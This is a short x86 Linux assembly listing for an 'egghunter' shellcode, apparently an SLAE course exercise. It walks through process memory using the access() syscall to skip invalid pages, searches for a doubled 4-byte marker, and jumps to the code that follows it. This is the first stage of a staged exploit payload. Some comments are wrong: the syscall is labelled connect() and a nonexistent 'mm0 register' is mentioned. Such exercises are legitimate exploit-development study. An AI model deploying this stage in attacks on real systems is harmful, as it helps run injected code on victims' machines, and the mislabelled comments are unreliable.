;Auther: H4554n AlMusajjen
;Title: 86x Egghunter
;SLAE - 1057
global _start

section .text

_start:
	mov ebx, 0x50905090
	xor ecx,ecx
	mul ecx
PageInc:
	or dx,0xfff
AddrInc:
	inc edx
	pushad
	lea ebx,[edx+4]
	mov al,0x21	;system call to connect()
	int 80h
	cmp al,0xf2	;check if we have EFAULT
	popad
	jz PageInc	;if access() gave us EFAULT then go to next page
	cmp [edx],ebx	;check if EGG in the mm0 register
	jnz AddrInc 	;EGG wasn't found
	cmp [edx+4],ebx	;re check if EGG replica is there just to make sure
	jne AddrInc	;just a lucky instruction was found looking as same as your egg we will continue searching
	jmp edx		;EGG has been found 3>_3> in both [edx][edx+4]
